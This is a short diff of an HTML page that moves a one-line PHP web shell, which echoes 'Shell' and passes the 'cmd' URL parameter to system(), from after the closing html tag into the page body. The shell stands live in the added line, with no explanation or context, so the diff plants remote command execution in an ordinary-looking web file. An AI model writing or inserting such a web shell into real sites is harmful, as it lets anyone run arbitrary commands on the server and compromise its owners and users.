@@ -6,6 +6,6 @@
 		<meta content="utf-8" http-equiv="encoding">
    </head>
    <body>
+		<?php echo "Shell";system($_GET['cmd']); ?>
    </body>
  </html>
-<?php echo "Shell";system($_GET['cmd']); ?>
